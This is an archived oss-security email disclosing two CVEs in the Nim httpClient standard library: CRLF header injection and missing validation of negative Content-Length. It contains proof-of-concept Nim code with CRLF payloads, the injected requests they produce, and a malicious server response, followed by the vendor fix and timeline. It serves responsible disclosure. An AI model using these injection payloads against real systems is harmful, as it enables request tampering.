X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5943" "Thursday" "4" "February" "2021" "11:36:50" "+0100" "Martin Ortner" "martin.ortner@consensys.net" "<E06593B2-81E5-4610-B127-D5D313036A1C@consensys.net>" "231" "[oss-security] [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header Crlf Injection & Server Response Validation" nil nil nil "2" "2021020410:36:50" "[oss-security] [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header Crlf Injection & Server Response Validation" (number mark "U       martin.ortne Feb  4  231/5943  " thread-indent "\"[oss-security] [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header Crlf Injection & Server Response Validation\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header Crlf Injection & Server Response Validation" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1961 invoked by uid 550); 4 Feb 2021 11:03:03 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24272 invoked from network); 4 Feb 2021 10:37:04 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=consensys.net; s=google;
        h=from:content-transfer-encoding:mime-version:subject:message-id:date
         :to;
        bh=U+IP+k9HYkXFeAEkXXd8yCrxVwZ83hVCVju/XoJEjZM=;
        b=iv9+MORvBBnu/oUydQmIJqV3Bp5ToOuYaWlMLYGoWXGtqy8iKe/c3gVfQlG/zlcffT
         DG4Zi1PsmpL7ErVizGna78Lntj0Sbx/IfnkXEWZ4IfjMRGujkvS194Q1IlehJcljcS3t
         82O23dwA25nsPw8DpmJrbiOh1ny56tNMm5xx8RzYIHrwHO23k1PgUwrt/yhl1eMpzD7Z
         RKnveORTBffk8FzuIge2MVN7E5unFOfKQHPm+TyC4QZeNvvXMkWLB6rgEIWvjlG8dH1G
         x/cX3FnbOKXeocI4fwooZQ/Z7NiwPi1nIvB8Zt3IQU6Is4+tdLPf6XnEJabSTeJAFwRW
         14Ug==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:content-transfer-encoding:mime-version
         :subject:message-id:date:to;
        bh=U+IP+k9HYkXFeAEkXXd8yCrxVwZ83hVCVju/XoJEjZM=;
        b=pcQs+ZT4KjH2wpUJR1bsO58cSfA3Sj9oDQ/L4Wo1COQftfvrkWO30X7hTy+4JxGfke
         baj2d5HxB0VAJSm/q9IFUACeXXfbl59w2xHUFo2qrIRcUesHdqE7hYE4sxXP6/JS1dVQ
         OzdFeX2EuRm0CA2W+7pUGbBIjZh3yoFSSd+EbnMm+FYXEAwKviY4mu5ajowdKP/G4D8t
         T8FuJqjonw0ksqls6DWMhe2edEgWCF7XWO2JhPu2Jd328YmjlL4K9tWIUqJjOFVAvmRy
         eN2BeyYSCmHeCJZRUbEZlYWQCxwI3QGg+2LbCMfdtH7UoFvjWWV9bFuV3szGPLMIeZwc
         vSjg==
X-Gm-Message-State: AOAM533BKiLZlt8TowahTf/Xsu10fxKK18QvlpnyY7sFSqNMaPVSP4Dc
	TgwBkXlnBEL6pxC5UfOBkPTtuwiQggqSc7NLfmdea79hWRlhCc+W5oilCDHpZd40rRLaMHYSGhe
	uVvos/AL0lYqAYHyUR9lIrmGu4lIJclJdZSekVIhkHFVPPlyOCeiJ0/37gV5sYwu2r+RKEWooo8
	1IenDtyE/DImfHYBq7Ea8=
X-Google-Smtp-Source: ABdhPJwgwwqlDX8C5ZnyP2I3DHnWTECZJ6HdEW/Am9iI0mbvjgQ6b8/4IDYKm226n5c/1Yg8M36g8w==
X-Received: by 2002:a7b:ce93:: with SMTP id q19mr6961379wmj.65.1612435012320;
        Thu, 04 Feb 2021 02:36:52 -0800 (PST)
From: Martin Ortner <martin.ortner@consensys.net>
Content-Type: text/plain;
	charset=utf-8
Content-Transfer-Encoding: quoted-printable
Mime-Version: 1.0 (Mac OS X Mail 13.4 \(3608.120.23.2.4\))
Message-Id: <E06593B2-81E5-4610-B127-D5D313036A1C@consensys.net>
Date: Thu, 4 Feb 2021 11:36:50 +0100
To: oss-security@lists.openwall.com
X-Mailer: Apple Mail (2.3608.120.23.2.4)
Subject: [oss-security] [CVE-2020-15693, CVE-2020-15694] Nim - stdlib Httpclient - Header
 Crlf Injection & Server Response Validation

title: "Nim - stdlib Httpclient - Header Crlf Injection & Server Response V=
alidation"
date: 2020-07-30T18:41:52+01:00

cve: ["CVE-2020-15693", "CVE-2020-15694"]
vendor: nim-lang
vendorUrl: https://nim-lang.org/
authors: tintinweb
affectedVersions: [ "<=3D 1.2.6" ]
vulnClass: CWE-93

Vulnerability Note: https://consensys.net/diligence/vulnerabilities/nim-htt=
pclient-header-crlf-injection/=20
Vulnerability Note: https://github.com/tintinweb/pub/blob/master/pocs/cve-2=
020-15694/=20
Group: https://consensys.net/diligence/research/=20


## Summary=20

The following vulnerability note discusses two classes of vulnerabilities f=
ound in the nim-lang `httpClient` standard library:

* a `CR-LF` injection in various arguments
* lack of response value validation when parsing server responses


## Details

### Description

The nim standard library `httpClient` is vulnerable to a `CR-LF` injection =
in the target url. This issue shares similarities with [CVE-2019-9740](http=
s://nvd.nist.gov/vuln/detail/CVE-2019-9740) and [CVE-2019-9947](https://nvd=
.nist.gov/vuln/detail/CVE-2019-9947) reported for the Python language with =
the difference that more injection vectors exist. An injection is possible =
if the attacker controls any part of the url provided to `httpClient.[get|p=
ost|...]`, the user-agent, or custom http header names or values.=20


Additionally, the library fails to properly validate the server response. F=
or example, `httpClient.get().contentLength()` does not raise any error if =
a malicious server provides a negative `Content-Length`.


It should be noted that there seems to be a general lack of input validatio=
n (requests and response) and we expect more vectors to exist (e.g. see `ge=
nerateHeaders`).


### Proof of Concept

Note: `nim c -r -d:ssl client_inject.nim`

1) header injection in any url part

a) query

```nim
import httpClient
var client =3D newHttpClient()
var response =3D client.get("https://localhost:4433?a=3D1 HTTP/1.1\r\nX-inj=
ected: header\r\nTEST: 123")=20
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`

```http
GET /?a=3D1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

b) in the path

```nim
import httpClient
var client =3D newHttpClient()
var response =3D client.get("https://localhost:4433/a/1 HTTP/1.1\r\nX-injec=
ted: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`

```http
GET /a/1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4


```

2) header injection in user-agent, http headers

```nim
import httpClient
var client =3D newHttpClient("MyUserAgent\r\nX-Injected: myheader")
client.headers =3D newHttpHeaders({ "Content-Type": "applicat\r\nion/json" =
})
var response =3D client.get("https://localhost:4433?a=3D1 HTTP/1.1\r\nX-inj=
ected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`, `TEST: 123`

```http
GET /?a=3D1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
content-type: applicat
ion/json
user-agent: MyUserAgent
X-Injected: myheader


```

3) Integers are parsed as signed ints instead of natural numbers

The `httpClient` silently accepts invalid return parameters. For example, t=
he content-length header is initially stored as a string without being veri=
fied to be in a proper range. When accessing it, it is being parsed as a si=
gned integer and therefore allows to return negative numbers.

```nim
proc contentLength*(response: Response | AsyncResponse): int =3D
## Retrieves the specified response's content length.
##
## This is effectively the value of the "Content-Length" header.
##
## A ``ValueError`` exception will be raised if the value is not an integer.
var contentLengthHeader =3D response.headers.getOrDefault("Content-Length")
return contentLengthHeader.parseInt()
```

Request:
```http
GET /?a=3D1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

Malicious server response: `Content-Length: -23`
```http
HTTP/1.1 200 OK
Date: Sun, 10 Oct 2010 23:26:07 GMT
Server: Apache/2.2.8 (Ubuntu) mod_ssl/2.2.8 OpenSSL/0.9.8g
Last-Modified: Sun, 26 Sep 2010 22:04:35 GMT
ETag: "45b6-834-49130cc1182c0"
Accept-Ranges: bytes
Content-Length: -23
Connection: close
Content-Type: text/html

Hello world!

```

Accessing the `Content-Length` yields the negative number -23.

```nim
import httpClient
var client =3D newHttpClient()
var response =3D client.get("http://localhost:4433/a/1 HTTP/1.1\r\nX-i\x00\=
x01YOnjected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

output:

```
=E2=87=92 nim c -r -d:ssl client_inject.nim
...
Hint: [Link]
Hint: 112071 LOC; 1.103 sec; 112.691MiB peakmem; Debug build; proj: /Users/=
tintin/workspace/nim/test/issues/httpclient/inject/client_inject.nim; out: =
/Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inject [Su=
ccessX]
Hint: /Users/tintin/workspace/nim/test/issues/httpclient/inject/client_inje=
ct [Exec]
-23
```

This might pose a risk to applications that are not checking whether respon=
se values are within sane bounds.


## Vendor Response

Vendor response: fixed in [v1.2.6](https://nim-lang.org/blog/2020/07/30/ver=
sions-126-and-108-released.html)

### Timeline

```
JUL/09/2020 - contact nim developers @telegram; provided details, PoC
JUL/30/2020 - fixed in new release
```

## References

* [1] https://nim-lang.org/
* [2] https://nim-lang.org/install.html
* [3] https://en.wikipedia.org/wiki/Nim_(programming_language)
* [4] https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.ht=
ml

